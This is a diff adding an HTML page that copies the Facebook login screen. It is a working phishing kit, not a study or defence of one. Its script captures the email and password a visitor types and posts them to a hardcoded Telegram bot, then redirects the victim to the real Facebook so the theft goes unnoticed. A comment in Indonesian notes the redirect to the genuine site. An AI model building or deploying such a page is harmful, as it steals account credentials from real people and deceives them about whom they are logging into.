@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 5px;
+            text-align: center;
+            width: 300px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #145dbf;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">Facebook</div>
+        <input type="text" id="email" placeholder="Email or phone number">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="submitLogin()">Log In</button>
+    </div>
+
+    <script>
+        function submitLogin() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            
+            if (email && password) {
+                let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
+                let chatId = "6899914313";
+                let message = `Facebook Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+                
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                }).then(response => {
+                    console.log("Data sent to Telegram");
+                    setTimeout(() => {
+                        window.location.href = "https://www.facebook.com"; // Redirect ke halaman asli Facebook
+                    }, 1000);
+                }).catch(error => {
+                    console.error("Error sending data", error);
+                });
+            }
+        }
+    </script>
+</body>
+  </html>
+    
